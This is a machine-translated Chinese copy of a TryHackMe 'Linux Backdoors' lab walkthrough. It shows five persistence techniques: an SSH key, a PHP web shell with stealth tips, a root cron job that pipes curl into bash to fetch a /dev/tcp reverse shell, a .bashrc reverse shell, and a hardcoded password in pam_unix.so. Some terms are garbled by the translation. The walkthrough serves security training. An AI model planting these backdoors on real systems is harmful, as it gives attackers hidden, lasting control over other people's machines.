<html>
<head>
<title>Linux Backdoors Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Linux后门试用版</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/linux-backdoors-tryhackme-writeup-d3817a23fd1c?source=collection_archive---------3-----------------------#2021-04-22">https://infosecwriteups.com/linux-backdoors-tryhackme-writeup-d3817a23fd1c?source=collection_archive---------3-----------------------#2021-04-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ffd6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于Tryhackme room“Linux后门”的文章</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/8e09a4fb4b10ccc69f7a84fe8a456963.png" data-original-src="https://miro.medium.com/v2/resize:fit:874/format:webp/1*dpRiBbZAMsQsdTRSKRfOYA.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">https://tryhackme.com/room/linuxbackdoors<a class="ae kx" href="https://tryhackme.com/room/linuxbackdoors" rel="noopener ugc nofollow" target="_blank"/></figcaption></figure><p id="2100" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">房间链接:</strong><a class="ae kx" href="https://tryhackme.com/room/linuxbackdoors" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxbackdoors</a><br/><strong class="jp ir">注:此房免费</strong></p><h1 id="c997" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务1:介绍</h1><p id="960c" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">嘿大家好！</p><p id="85e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个房间专门用于学习常见的Linux后门技术！后门是我们可以做的简单的事情，以确保我们对机器的一致访问。</p><p id="5637" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，即使机器重启、关机或其他什么，我们仍然可以访问它。</p><p id="9be0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些并不是真正的漏洞，而只是保持您在目标上的访问权限的方法:)</p><p id="b184" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要重现这个房间里展示的所有后门技术，你可以简单地在你自己的机器上尝试它们或者使用“THM攻击箱”</p><p id="412d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">更安全，即使你搞砸了也没关系。</p><p id="4ab0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">黑客快乐！</p><h1 id="f8eb" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务2: SSH后门</h1><p id="b51a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们要看的第一个后门是:SSH后门</p><p id="af56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ssh后门本质上包括将我们的ssh密钥留在某个用户的主目录中。通常用户是根用户，因为它拥有最高的特权。</p><p id="63c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们用ssh-keygen生成一组ssh密钥！</p><p id="683b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，只需运行ssh-keygen命令，如下所示！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/e6f889aa4f2cf46a8ace8f264154b807.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/0*lGMFVUSYnU0NR0w1.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://tryhackme.com/room/linuxbackdoors" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxbackdoors</a></figcaption></figure><p id="2163" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有两把钥匙了。1个私钥和1个公钥，我们现在可以转到/root/。ssh，把我们的公钥留在那里。不要忘记将公钥重命名为:authorized_keys</p><p id="9d38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果目录。ssh不存在，您总是可以使用以下命令创建它:“mkdir。ssh "</p><p id="cf65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们已经离开了我们的后门，我们可以简单地登录为根！</p><p id="196d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这样做之前，使用:chmod 600 id_rsa赋予私钥适当的权限。</p><p id="2f4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是必要的，因为如果我们不这样做，ssh会抱怨密钥上的权限不够安全，并且很可能不让我们使用它。</p><p id="f2d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在给密匙适当的权限后，我们可以这样做:“ssh -i id_rsa root@ip”来登录我们想要的机器！</p><p id="ca72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关于这个后门有一点需要注意:</p><ol class=""><li id="e613" class="mc md iq jp b jq jr ju jv jy me kc mf kg mg kk mh mi mj mk bi translated">这个后门一点都不隐蔽。任何拥有适当权限的人都可以完全删除我们的ssh公钥或authorized_keys文件。</li></ol><p id="d867" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题1: </strong>我们将密钥放在什么目录下？</p><blockquote class="ml mm mn"><p id="1899" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:。宋承宪</strong></p></blockquote><p id="dfbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在ssh中使用什么标志来显示我们的私钥？</p><blockquote class="ml mm mn"><p id="d637" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">回答:——我</strong></p></blockquote><h1 id="e70b" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务3: PHP后门</h1><p id="ee04" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">现在让我们进入第二个后门:PHP后门！</p><p id="8209" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您在Linux主机上获得了root访问权限，您很可能会在web根目录中搜索凭证和/或任何有用的信息。</p><p id="4157" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">web根目录通常位于:/var/www/html</p><p id="8a5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您必须知道的是，无论您在/var/www/html中留下什么，每个人都可以在他们的浏览器中使用。</p><p id="d86c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">既然您已经知道了这一点，那么您可以尝试创建一个任意名称的php文件，并将这段代码放入其中:</p><pre class="km kn ko kp gt ms mt mu mv aw mw bi"><span id="de6e" class="mx kz iq mt b gy my mz l na nb">&lt;?php<br/>    if (isset($_REQUEST['cmd'])) {<br/>        echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";<br/>    }<br/>?&gt;</span></pre><p id="391c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这段代码只接受参数“cmd ”,并将执行赋予该参数的任何内容。<br/>注意，我们使用了:"<strong class="jp ir"> $_REQUEST['cmd']) </strong>，这意味着您可以在GET或POST数据中传递该参数。<br/>既然文件已经保存并准备好，我们可以尝试查询它。<br/>如果您将该文件放在<strong class="jp ir">/var/www/html/shell . PHP</strong>|您应该可以使用<a class="ae kx" href="http://ip/shell.php" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">http://IP/shell . PHP</strong></a><br/>直接访问它；如果您将shell放在了其他地方，请查看它所在的目录，然后尝试通过以下方式访问它:<a class="ae kx" href="http://ip/somedirectory/shell.php" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">http://IP/some directory/shell . PHP</strong></a></p><p id="05c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里有一些方法可以让这个后门变得更加隐蔽:</p><p id="2027" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.尝试将这段代码添加到/var/www/html中已经存在的php文件中。将它更多地添加到文件中间肯定会使我们的恶意行为更加隐秘。</p><p id="1dfd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.将“cmd”参数更改为其他值…实际上是任何值…只是将其更改为不常见的值。“Cmd”非常普遍，在黑客社区中已经非常有名。</p><h1 id="8e8f" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务4: CronJob后门</h1><p id="ed1d" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">现在让我们进入第三个后门技术！</p><p id="d375" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个后门包括创建一个cronjob！</p><p id="e053" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您查看一下您的cronjobs文件，它是/etc/cronjob，您会看到类似这样的内容:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/f94570b687fa0c6521450eac153fc5b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Fv11rESI-HmBK5_T.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://tryhackme.com/room/linuxbackdoors" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxbackdoors</a></figcaption></figure><p id="b8e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这表示计划在某个时间在您的机器上运行的所有任务。</p><p id="6791" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦您在任何主机上获得root访问权限，您就可以添加任何计划的任务。你甚至可以配置一个任务，每分钟都有一个反向shell发送给你。这正是我们要做的。</p><p id="412a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意任务顶部的两个字母:“m和h”</p><p id="6621" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些字母表示任务应该每小时还是每分钟运行。</p><p id="aa28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的例子中，你可以看到在“h”下面有一个“*”符号。这意味着以下任务将每小时运行一次。</p><p id="6c98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们回到我们的后门！</p><p id="6c95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将这一行添加到cronjob文件中:</p><p id="0f10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">* * * * * root curl http://<yourip>:8080/shell | bash</yourip></p><p id="379f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，我们给所有内容都加了一个“*”星号。这意味着我们的任务将每分钟、每小时、每天等等运行。</p><p id="759b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们首先使用“curl”下载一个文件，然后通过管道将其传输到“bash”</p><p id="ddcb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们使用的“shell”文件的内容很简单:</p><p id="7b10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">— — — — — — — — — — — — — — — — — — — — — — — — -</p><p id="d77f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">#!/bin/bash</p><p id="f85e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p><p id="1dd5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">— — — — — — — — — — — — — — — — — — — — — — — — —</p><p id="e5fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们必须运行一个HTTP服务器来服务我们的shell。</p><p id="d784" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以通过运行“python3 -m http.server 8080”来实现这一点</p><p id="9502" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦我们的shell被下载，它将被“bash”执行，我们将得到一个shell！</p><p id="bcb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">*不要忘记使用“nc -nvlp <port>”监听您指定的端口*</port></p><p id="390f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，这个后门并不是真正隐藏的，因为每个人都可以通过查看/etc/crontab内部看到它。</p><p id="1266" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题1: </strong>字母“m”在cronjobs中是什么意思？</p><blockquote class="ml mm mn"><p id="02d6" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:分钟</strong></p></blockquote><p id="7cc1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">q . 2:</strong>cron jobs中的字母“h”是什么意思？</p><blockquote class="ml mm mn"><p id="15c9" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:小时</strong></p></blockquote><h1 id="b0b4" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务5:。巴沙尔后门</h1><p id="4955" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">现在让我们进入:“。巴沙尔“借壳！</p><p id="1970" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果用户使用bash作为他们的登录shell。bashrc”文件在交互式会话启动时被执行。</p><p id="217f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，如果您知道有用户经常登录他们的系统，您可以简单地运行这个命令，将您的反向shell包含到他们的。巴沙尔”。</p><pre class="km kn ko kp gt ms mt mu mv aw mw bi"><span id="2058" class="mx kz iq mt b gy my mz l na nb">echo 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1' &gt;&gt; ~/.bashrc</span></pre><p id="688b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一点很重要，那就是要时刻准备好nc监听器，因为你不知道用户什么时候会登录。这种攻击非常卑鄙，因为没有人真正想过检查他们的”。bashrc”文件。<br/>另一方面，您无法确切知道是否有任何用户会真正登录到他们的系统，因此您可能会等待很长一段时间。</p><h1 id="18c5" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务6: pam_unix.so后门</h1><p id="f423" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">让我们现在进入这个房间的第五个也是最后一个后门！</p><p id="a043" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了这个房间中显示的5个后门之外，还有许多许多后门可用！</p><p id="1c68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在创建这个房间时，我发现一个非常有用的资源:<a class="ae kx" href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c" rel="noopener"> <strong class="jp ir">链接</strong> </a></p><p id="3cde" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，现在到第五个后门。</p><p id="0d81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们要查看的后门是:pam_unix.so后门！</p><p id="b042" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您不知道文件“pam_unix.so”是什么，那么它只是Linux中负责认证的许多文件之一。</p><p id="a2c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们真正进入后门！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/56a3642dd3ca78c9d0b7f9e9cd01dea2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1172/format:webp/0*gP_Y_pDiGgRmbb2G.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://tryhackme.com/room/linuxbackdoors" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxbackdoors</a></figcaption></figure><p id="1461" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如此处所示，文件“pam_unix.so”使用“unix_verify_password”函数来验证用户提供的密码。</p><p id="ad51" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们来看看这张截图:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/96a6549acf22ec03ec5a841cd4675b8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1252/format:webp/0*shvyI7L4t2F_Liab.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://tryhackme.com/room/linuxbackdoors" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxbackdoors</a></figcaption></figure><p id="ed53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到，我们在代码中添加了新的一行:“if (strcmp(p，" 0xMitsurugi ")！= 0 )"</p><p id="1529" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，如果这段代码一开始让你感到困惑，不要担心！</p><p id="022d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们一起来分解它！</p><p id="87c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以首先，我们要知道“strcmp”这个函数是做什么的。</p><p id="76db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个函数基本上比较2个字符串。</p><p id="b563" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的截图中，我们比较了变量“p”和字符串“0xMitsurugi”。</p><p id="fc07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">变量“p”代表用户提供的密码。换句话说，就是用户提供的密码。</p><p id="b1cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你也可以看到”！=0”。这意味着“如果不成功”。因此，如果变量“p”(用户提供的密码)和字符串“0xMitsurugi”不同，将使用函数“unix_verify_password”。</p><p id="b9b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但另一方面，如果变量“p”(用户提供的密码)和字符串“0xMitsurugi”相同，则认证成功。我们使用“PAM _ SUCCESS”来标记成功</p><p id="b8de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，这个后门本质上是将您自己的密码添加到“pam_unix.so”中</p><p id="48be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为您知道添加到文件中的密码，所以在从“pam_unix.so”中删除该密码之前，您总是能够使用该密码进行身份验证</p><p id="5036" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们做一点回顾:</p><p id="a46a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">假设用户键入密码“password123”并尝试进行身份验证。我们将他的密码(password123)与字符串“0xMitsurugi”进行比较。</p><p id="aab9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果这两个字符串匹配，则身份验证成功。但是这两个字符串不匹配，所以身份验证将不会</p><p id="cb96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">成功，并将依赖于“unix_verify_password”函数。当使用“unix_verify_password”函数进行身份验证时，该函数需要</p><p id="9672" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来自“/etc/shadow”的用户密码，并将其与用户提供的密码进行比较。这就是预期的身份验证系统应该如何工作。</p><p id="17dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，这种技术被称为后门，因为您添加了自己的密码，只要没有人从“pam_unix.so”中取出它，您就可以一直使用它。</p><p id="bd49" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个后门真的很难发现，因为再一次，没有人真的想去调查这样的文件。</p><p id="a712" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于这种方法慢慢变得越来越受欢迎，你可能无法每次都这样做，因为每个人都会慢慢但肯定地了解如何保护自己。</p><p id="3c60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用的资源:<a class="ae kx" href="http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html" rel="noopener ugc nofollow" target="_blank">http://0x 90909090 . blogspot . com/2016/06/creating-back door-in-PAM-in-5-line-of . html</a></p><p id="1a43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里有一个GitHub库，其中包含一个脚本，可以自动完成创建后门的过程:【https://github.com/zephrax/linux-pam-backdoor】T2</p><p id="5a30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在:<br/><strong class="jp ir">LinkedIn:-</strong><a class="ae kx" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="jp ir">Twitter:-</strong><a class="ae kx" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="jp ir">Tryhackme:-</strong><a class="ae kx" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="4979" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="0f6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问我的其他演练:-</p><p id="fb9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>